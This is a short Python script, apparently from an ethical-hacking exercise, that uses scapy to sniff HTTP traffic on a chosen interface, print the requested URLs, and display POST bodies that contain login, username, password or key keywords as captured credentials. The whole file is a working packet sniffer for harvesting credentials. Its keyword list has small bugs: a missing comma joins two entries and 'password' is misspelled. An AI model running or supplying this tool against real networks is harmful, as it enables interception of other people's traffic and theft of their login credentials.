#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http                                                           #third party module to filter http since scapy do not filter http layer
import optparse



def get_arguements():
    # Parse the arguements from command line
    parser = optparse.OptionParser()                                             
    parser.add_option("-i", "--interface", dest="interface", help="Interface")             
    options=parser.parse_args() [0]                                               

    # checks necessary options are provided                       
    if not options.interface:
        parser.error("[-]Please specify the interface,use --help for more info")

    return options


def get_url(packet):
    # Returns the url requested
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path                     #appending host with path fields to form url in httprequest layer

def get_login_info(packet):
    # Checks if there is username or password in the packet
    load = packet[scapy.Raw].load.decode(errors="ignore")                                    #load is a field in packet with usernames and passwords
    keywords = ["login", "email", "username","usr" "uname", "passsword", "passwd", "pass", "key"]            
    for keyword in keywords:                                                                    
        if keyword in load:
            return load

def process_sniffed_packet(packet):
    # Filters the Http packet 
    if packet.haslayer(http.HTTPRequest):                                                      #http is module and HTTPRequest is layer                                             
        # print(packet.show())                                                                                   
        url=get_url(packet)
        print("\033[32m[+]HTTP REQUESTED >>\033[00m" + "\033[93m" + url.decode() + "\033[00m")
                                                                                            #print(packet.show())  #to see the fields of the layer
        if packet.haslayer(scapy.Raw):                                                       #checks another layer raw(post is used in http to hide data in link)
            login_info=get_login_info(packet)
            if login_info:
                print("\n\n"+"\033[32m[+]Possible username/password >\033[00m" + "\033[34m" + login_info + "\033[00m\n\n")

def sniff(interface):
    # Sniff for every packet through interface                                               #prn to execute another function when it catches a packet
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)                    #store=False for not store the output,
    #scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet,filter ="udp")     #filter to filter the packet like udp,port 21

# main code
options=get_arguements()
try:
    sniff(options.interface)
except Exception as error:
    print(error)
    exit()
